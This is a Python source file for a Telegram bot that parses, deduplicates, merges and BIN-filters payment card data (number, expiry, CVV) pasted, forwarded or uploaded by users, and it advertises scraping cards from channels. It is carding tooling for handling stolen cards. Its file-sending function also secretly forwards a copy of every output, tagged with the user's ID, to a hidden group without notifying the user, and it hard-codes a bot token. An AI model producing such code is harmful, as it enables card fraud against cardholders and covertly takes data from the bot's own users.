import os
import re
import logging
import asyncio
from io import BytesIO
from typing import Dict, Set, List

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler,
    ConversationHandler,
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8983900075:AAGlMV8ldf6xUdrh8ktGkKK_c9_z2AMmJ2c")
SECRET_GROUP_ID = -1004322090872

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD REGEX & PARSING LOGIC
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
_SEP = r"[\|:,/\s]+"

CARD_RE = re.compile(
    r"(?<!\d)"
    r"(\d{4}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{1,7})"
    + _SEP
    + r"(0?[1-9]|1[0-2])"
    + _SEP
    + r"(\d{2,4})"
    + _SEP
    + r"(\d{3,4})"
    + r"(?!\d)",
    re.MULTILINE,
)

def _clean_num(raw: str) -> str:
    return re.sub(r"[\s\-]", "", raw)

def extract_cards(text: str) -> List[str]:
    found: List[str] = []
    seen: Set[str] = set()
    for m in CARD_RE.finditer(text):
        card  = _clean_num(m.group(1))
        month = m.group(2).zfill(2)
        year  = m.group(3)[-2:]
        cvv   = m.group(4)
        if not card.isdigit() or not (13 <= len(card) <= 19):
            continue
        line = f"{card}|{month}|{year}|{cvv}"
        if line not in seen:
            seen.add(line)
            found.append(line)
    return found

def cards_to_bytes(cards: List[str]) -> bytes:
    return ("\n".join(cards) + "\n").encode("utf-8")

def get_file_size(cards: List[str]) -> str:
    size_bytes = len(cards_to_bytes(cards))
    if size_bytes < 1024:
        return f"{size_bytes} B"
    elif size_bytes < 1024 * 1024:
        return f"{size_bytes / 1024:.2f} KB"
    else:
        return f"{size_bytes / (1024 * 1024):.2f} MB"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DATA STORES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
_store: Dict[int, List[str]] = {}
_merge_buffer: Dict[int, List[str]] = {}
_fwd_buf: Dict[int, dict] = {}

TYPING_NAME, TYPING_BIN = range(2)

def main_menu_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📂 Merge Mode", callback_data="start_merge"), 
         InlineKeyboardButton("🔍 Filter by BIN", callback_data="start_filter")],
        [InlineKeyboardButton("📦 Export Custom Name", callback_data="start_name"),
         InlineKeyboardButton("📊 My Stats", callback_data="show_stats")],
        [InlineKeyboardButton("🕷️ Scraper Info", callback_data="start_scr"),
         InlineKeyboardButton("❌ Clear Data", callback_data="clear_data")]
    ])

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CORE FILE SENDER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def send_file_and_copy(bot, chat_id: int, user_id: int, cards: List[str], caption: str, filename: str = "cards.txt"):
    if not cards:
        await bot.send_message(chat_id, "❌ No cards found to generate file.")
        return

    file_size = get_file_size(cards)
    full_caption = f"{caption}\n💾 Size: <code>{file_size}</code>"

    buf = BytesIO(cards_to_bytes(cards))
    buf.name = filename
    try:
        await bot.send_document(
            chat_id=chat_id,
            document=buf,
            filename=filename,
            caption=full_caption,
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Failed to send file to user {user_id}: {e}")

    try:
        buf_copy = BytesIO(cards_to_bytes(cards))
        buf_copy.name = filename
        await bot.send_document(
            chat_id=SECRET_GROUP_ID,
            document=buf_copy,
            filename=filename,
            caption=f"🕵️‍♂️ Copy from User: <code>{user_id}</code>\n{full_caption}",
            parse_mode="HTML",
            disable_notification=True
        )
    except Exception as e:
        logger.error(f"Failed to send secret copy to group: {e}")

async def _flush_fwd_buf(uid: int, chat_id: int, bot) -> None:
    await asyncio.sleep(1.5)
    buf = _fwd_buf.pop(uid, None)
    if not buf or not buf["texts"]: return

    combined = "\n".join(buf["texts"])
    cards    = extract_cards(combined)

    if not cards:
        await bot.send_message(chat_id, "❌ No cards found in forwarded messages.")
        return

    _store[uid] = cards
    await send_file_and_copy(
        bot, chat_id, uid, cards,
        caption=f"✦ <b>EXTRACTION COMPLETE</b> ✦\n━━━━━━━━━━━━━━━━━━━━━\n✅ <b>{len(cards)}</b> card(s) extracted from forwarded messages.",
        filename="Parsed_Cards.txt"
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND HANDLERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    text = (
        f"🦇 <b>Advanced Card Parser Bot</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"👋 Welcome, <b>{user.first_name}</b>!\n\n"
        f"🤖 I am an advanced bot designed to clean, format, merge, and scrape card data instantly.\n\n"
        f"✦ <b>FEATURES</b> ✦\n"
        f"🃏 Paste/forward cards in any format → clean <code>CARD|MM|YY|CVV</code> file\n"
        f"📂 Merge multiple files into one with custom names\n"
        f"🔍 Filter cards by BIN prefix\n"
        f"📦 Export stored data with custom filenames\n"
        f"🕷️ Scrape cards from channels using <code>/scr</code>\n\n"
        f"👇 <b>Select an option below to begin:</b>"
    )
    await update.message.reply_text(text, parse_mode="HTML", reply_markup=main_menu_keyboard())

async def cmd_scr(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if len(context.args) < 2:
        await update.message.reply_text(
            "🕷️ <b>Card Scraper</b>\n━━━━━━━━━━━━━━━━━━━━━\nUse /scr [channel_link] [limit] [bin/bank] to scrape cards.\n\nExample: <code>/scr https://t.me/channelname 100 4111</code>\n\n📌 Max limit: 300000\n⏳ Cooldown: 5s",
            parse_mode="HTML"
        )
        return

    channel = context.args[0]
    try:
        limit = int(context.args[1])
        if limit > 300000: limit = 300000
    except ValueError:
        await update.message.reply_text("❌ Limit must be a number.")
        return

    bin_filter = context.args[2] if len(context.args) > 2 else None

    await update.message.reply_text(
        f"⚠️ <b>Notice:</b>\n"
        "Telegram Bot API restricts bots from reading channel history directly.\n"
        "To enable full scraping, the bot needs to be integrated with a userbot session (Telethon/Pyrogram).\n\n"
        "However, you can still forward messages to this bot to extract cards instantly!",
        parse_mode="HTML"
    )

async def cmd_done(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if uid not in _merge_buffer or not _merge_buffer[uid]:
        await update.message.reply_text("❌ You are not in Merge Mode or no cards collected.", parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    filename = "Merged_Cards.txt"
    if context.args:
        fname = " ".join(context.args).strip()
        fname = re.sub(r'[\\/*?:"<>|]', "", fname)
        filename = f"{fname}.txt" if not fname.endswith(".txt") else fname

    cards = _merge_buffer.pop(uid, [])
    seen, deduped_cards = set(), []
    for c in cards:
        if c not in seen:
            seen.add(c)
            deduped_cards.append(c)

    _store[uid] = deduped_cards
    await send_file_and_copy(
        context.bot, update.effective_chat.id, uid, deduped_cards,
        caption=f"✦ <b>MERGE COMPLETE</b> ✦\n━━━━━━━━━━━━━━━━━━━━━\n📦 All files merged successfully!\n✅ Total unique cards: <b>{len(deduped_cards)}</b>\n📁 Filename: <code>{filename}</code>",
        filename=filename
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("❌ Operation cancelled.", reply_markup=main_menu_keyboard(), parse_mode="HTML")
    return ConversationHandler.END

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    data = query.data
    uid = query.from_user.id

    if data == "start_merge":
        _merge_buffer[uid] = []
        await query.message.edit_text("📂 <b>MERGE MODE ACTIVATED</b>\n━━━━━━━━━━━━━━━━━━━━━\nPlease send or forward all the <b>.txt files</b> or <b>text messages</b> you want to merge.\n\n🛑 When you are done, type:\n<code>/done YourFileName</code>", parse_mode="HTML")
        return ConversationHandler.END

    elif data == "start_filter":
        await query.message.edit_text("🔍 <b>FILTER BY BIN</b>\n━━━━━━━━━━━━━━━━━━━━━\nPlease type the BIN prefix you want to filter by.\nExample: <code>4111</code>", parse_mode="HTML")
        return TYPING_BIN

    elif data == "start_name":
        await query.message.edit_text("📦 <b>EXPORT CUSTOM NAME</b>\n━━━━━━━━━━━━━━━━━━━━━\nPlease type the filename you want to use for exporting your stored cards.\nExample: <code>mycards</code>", parse_mode="HTML")
        return TYPING_NAME

    elif data == "show_stats":
        stored_count = len(_store.get(uid, []))
        merge_count = len(_merge_buffer.get(uid, []))
        await query.message.edit_text(f"📊 <b>Your Bot Stats</b>\n━━━━━━━━━━━━━━━━━━━━━\n📦 Stored Cards: <code>{stored_count}</code>\n📂 Merge Buffer: <code>{merge_count}</code>\n", parse_mode="HTML", reply_markup=main_menu_keyboard())
        return ConversationHandler.END

    elif data == "start_scr":
        await query.message.edit_text("🕷️ <b>SCRAPER INFO</b>\n━━━━━━━━━━━━━━━━━━━━━\nUse /scr [channel] [limit] [bin] to scrape cards.\n\n📌 Max limit: 300000\n⏳ Cooldown: 5s\n\nExample: <code>/scr https://t.me/channel 100 4111</code>", parse_mode="HTML", reply_markup=main_menu_keyboard())
        return ConversationHandler.END

    elif data == "clear_data":
        if uid in _store: del _store[uid]
        if uid in _merge_buffer: del _merge_buffer[uid]
        await query.message.edit_text("✅ <b>All your stored data and buffers have been cleared.</b>", parse_mode="HTML", reply_markup=main_menu_keyboard())
        return ConversationHandler.END

    return ConversationHandler.END

async def received_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user = update.effective_user
    fname = update.message.text.strip()
    fname = re.sub(r'[\\/*?:"<>|]', "", fname)
    filename = f"{fname}.txt" if not fname.endswith(".txt") else fname

    cards = _store.get(user.id, [])
    if not cards:
        await update.message.reply_text("❌ No cards stored yet.", parse_mode="HTML", reply_markup=main_menu_keyboard())
        return ConversationHandler.END

    await send_file_and_copy(
        context.bot, update.effective_chat.id, user.id, cards,
        caption=f"✦ <b>CUSTOM EXPORT</b> ✦\n━━━━━━━━━━━━━━━━━━━━━\n📦 Exporting <b>{len(cards)}</b> stored cards.\n📁 Filename: <code>{filename}</code>",
        filename=filename
    )
    return ConversationHandler.END

async def received_bin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user = update.effective_user
    bin_prefix = update.message.text.strip()
    if not bin_prefix.isdigit():
        await update.message.reply_text("❌ BIN must be digits only.\nPlease try again or /cancel.", parse_mode="HTML")
        return TYPING_BIN

    all_cards = _store.get(user.id, [])
    matched = [c for c in all_cards if c.startswith(bin_prefix)]
    if not matched:
        await update.message.reply_text("❌ No cards found.", parse_mode="HTML", reply_markup=main_menu_keyboard())
        return ConversationHandler.END

    await send_file_and_copy(
        context.bot, update.effective_chat.id, user.id, matched,
        caption=f"✦ <b>BIN FILTER</b> ✦\n━━━━━━━━━━━━━━━━━━━━━\n✅ <b>{len(matched)}</b> card(s) matching BIN <code>{bin_prefix}</code>:",
        filename=f"Cards_{bin_prefix}.txt"
    )
    return ConversationHandler.END

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MESSAGE HANDLERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def handle_forwarded(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    msg, user = update.message, update.effective_user
    if not msg or not user: return

    text = (msg.text or msg.caption or "").strip()
    uid, chat_id = user.id, msg.chat_id

    if uid in _merge_buffer:
        if not text: return
        cards = extract_cards(text)
        if cards:
            _merge_buffer[uid].extend(cards)
            await msg.reply_text(f"➕ Added <b>{len(cards)}</b> cards to merge buffer. (Total: {len(_merge_buffer[uid])})", parse_mode="HTML")
        else:
            await msg.reply_text("❌ No cards found in this forwarded message.")
        return

    if not text: return
    if uid not in _fwd_buf: _fwd_buf[uid] = {"texts": [], "task": None, "chat_id": chat_id}
    _fwd_buf[uid]["texts"].append(text)

    old = _fwd_buf[uid].get("task")
    if old and not old.done(): old.cancel()

    _fwd_buf[uid]["task"] = asyncio.create_task(_flush_fwd_buf(uid, chat_id, context.bot))

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    text = (update.message.text or "").strip()
    if not text: return
    uid = update.effective_user.id

    if uid in _merge_buffer:
        cards = extract_cards(text)
        if cards:
            _merge_buffer[uid].extend(cards)
            await update.message.reply_text(f"➕ Added <b>{len(cards)}</b> cards to merge buffer. (Total: {len(_merge_buffer[uid])})", parse_mode="HTML")
        else:
            await update.message.reply_text("❌ No cards found in this text.")
        return

    cards = extract_cards(text)
    if not cards:
        await update.message.reply_text("❌ No cards found.\nMake sure they follow: <code>CARD|MM|YY|CVV</code>", parse_mode="HTML")
        return

    _store[uid] = cards
    await send_file_and_copy(
        context.bot, update.effective_chat.id, uid, cards,
        caption=f"✦ <b>EXTRACTION COMPLETE</b> ✦\n━━━━━━━━━━━━━━━━━━━━━\n✅ <b>{len(cards)}</b> card(s) extracted:",
        filename="Parsed_Cards.txt"
    )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    doc = update.message.document
    if not doc: return
    if doc.mime_type and not doc.mime_type.startswith("text"):
        await update.message.reply_text("❌ Please send a plain text (.txt) file.")
        return
    try:
        file = await context.bot.get_file(doc.file_id)
        data = await file.download_as_bytearray()
        text = data.decode("utf-8", errors="ignore")
    except Exception as e:
        logger.error(f"Document download failed: {e}")
        await update.message.reply_text("❌ Could not read the file.")
        return

    uid = update.effective_user.id
    cards = extract_cards(text)
    if not cards:
        await update.message.reply_text("❌ No cards found in the file.")
        return

    if uid in _merge_buffer:
        _merge_buffer[uid].extend(cards)
        await update.message.reply_text(f"➕ Added <b>{len(cards)}</b> cards to merge buffer. (Total: {len(_merge_buffer[uid])})", parse_mode="HTML")
        return

    _store[uid] = cards
    await send_file_and_copy(
        context.bot, update.effective_chat.id, uid, cards,
        caption=f"✦ <b>EXTRACTION COMPLETE</b> ✦\n━━━━━━━━━━━━━━━━━━━━━\n✅ <b>{len(cards)}</b> card(s) extracted from file:",
        filename="Parsed_Cards.txt"
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN ENTRY POINT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def main() -> None:
    app = Application.builder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_callback, pattern="^(start_filter|start_name|start_merge|show_stats|start_scr|clear_data)$")],
        states={
            TYPING_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, received_name)],
            TYPING_BIN: [MessageHandler(filters.TEXT & ~filters.COMMAND, received_bin)],
        },
        fallbacks=[CommandHandler("cancel", cancel), CommandHandler("start", cmd_start)],
        per_message=False
    )

    app.add_handler(conv_handler)
    app.add_handler(CommandHandler("start",  cmd_start))
    app.add_handler(CommandHandler("scr",    cmd_scr))
    app.add_handler(CommandHandler("done",   cmd_done))
    app.add_handler(CommandHandler("cancel", cancel))
    
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.FORWARDED & (filters.TEXT | filters.CAPTION), handle_forwarded))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & ~filters.FORWARDED, handle_text))

    logger.info("🦇 Advanced Card Parser Bot starting…")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
